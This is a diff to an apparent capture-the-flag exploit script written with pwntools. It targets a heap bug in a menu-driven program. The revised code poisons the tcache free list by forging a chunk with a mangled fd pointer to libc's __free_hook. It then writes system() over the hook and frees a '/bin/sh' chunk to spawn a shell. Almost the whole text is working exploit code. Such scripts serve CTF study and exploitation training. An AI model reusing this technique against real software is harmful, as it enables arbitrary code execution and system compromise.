@@ -71,7 +71,7 @@ def delete_feedback(idx):
     menu(1)
     send_num(idx)
 
-def add_contact_details():
+def add_contact_details(data):
     menu(2)
     send(data)
 
@@ -88,6 +88,7 @@ class Constants:
     max_friend_name_len = 0x90 - 1
     max_num_movies = 7
     max_num_friends = 8
+    max_feedbacks = 10
 
 # Name.
 send("x"*0x64)
@@ -135,26 +136,29 @@ log.info("heap base: %#x" % heap_base)
 menu(2)
 send("y")
 
-for i in range(10):
+for i in range(Constants.max_feedbacks):
     add_feedback(str(i)*0x10)
-# Fill tcache bin to avoid double-free scanning there.
-for i in range(7):
+for i in reversed(range(Constants.max_feedbacks-1)):
     delete_feedback(i)
 
-# Leave last feedback unfreed (i.e., it remains in-use) so prevent
-# consolidation of the remaining free chunks with the top chunk.
+# Create a vacancy in the 0x110 tcache list.
+add_feedback("/bin/sh\x00")
 
-# Double free? XXX
-delete_feedback(7)
-delete_feedback(8)
-delete_feedback(7)
+# Free the forged chunk.
+delete_feedback(1)
 
-# Empty tcache
-for i in range(7):
-    add_feedback(str(i)*0x10)
+# This request will be serviced by a consolidated combination of previous 0x110
+# chunks. Due to this chunk's larger size, we can overwrite metadata of one
+# of the 0x110 chunks that remains in use.
+fake_fd_pointer = ((heap_base + 0xbf0) >> 12) ^ libc.sym.__free_hook
+fake_chunk = p64(0x110) + p64(0x111) + p64(fake_fd_pointer)
+add_contact_details(b"A"*0x100 + fake_chunk)
 
-add_feedback("double1")
-add_feedback("double2")
-add_feedback("double3")
+# Allocate until we get a chunk placed over __free_hook.
+add_feedback("B"*0x10)
+add_feedback(p64(libc.sym.system))
+
+# Trigger __free_hook.
+delete_feedback(0)
 
 io.interactive()
